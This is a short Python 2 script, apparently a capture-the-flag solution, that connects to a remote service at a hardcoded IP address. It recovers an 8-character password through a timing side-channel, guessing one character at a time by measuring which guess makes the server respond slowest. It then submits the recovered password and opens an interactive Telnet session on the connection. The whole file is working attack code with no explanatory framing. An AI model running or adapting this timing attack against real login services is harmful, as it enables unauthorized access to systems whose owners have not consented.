from socket import socket
from telnetlib import Telnet
import time

allowed = "UVWXYZAFBCDQRSTGHIJNOPKLEM"

sock = socket()
sock.connect(('167.172.123.213', 13373))
#sock.connect(('localhost', 5555))

print("Header:  ",sock.recv(1024))
print("Header2: ",sock.recv(1024))

known = ""

for i in range(8):
	maxtime = 0
	bestchar = "-"
	for trial in allowed:
		query = known + trial + "U"*(7-len(known))
		print "Try ",query
		start = time.time()
		sock.send(query+'\n')
		result = sock.recv(1024)
		print("> " + result)
		result = sock.recv(1024)
		print("> " + result)
		end = time.time()
		tt = 1000*(end-start)
		print "Time = ",tt

		if(tt > maxtime):
			maxtime = tt
			bestchar = trial

	print "Keep ",bestchar
	known += bestchar

print "Think it's ",known
sock.send(known+'\n')
result = sock.recv(1024)
print("> " + result)

t = Telnet()
t.sock = sock
t.interact()
sock.close()